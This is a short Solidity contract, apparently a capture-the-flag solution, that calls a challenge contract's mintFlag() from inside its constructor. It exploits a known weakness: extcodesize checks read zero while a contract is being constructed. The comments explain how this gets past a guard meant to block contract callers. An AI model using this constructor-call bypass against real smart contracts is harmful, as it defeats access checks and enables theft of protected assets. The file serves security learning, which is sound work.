//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

contract Challenge3Solution {
    constructor(address challenge) {
        // Call mintFlag during construction
        // This makes msg.sender != tx.origin (contract vs EOA)
        // And extcodesize(caller()) == 0 because contract is still being constructed
        (bool success,) = challenge.call(abi.encodeWithSignature("mintFlag()"));
        require(success, "Call failed");
    }
} 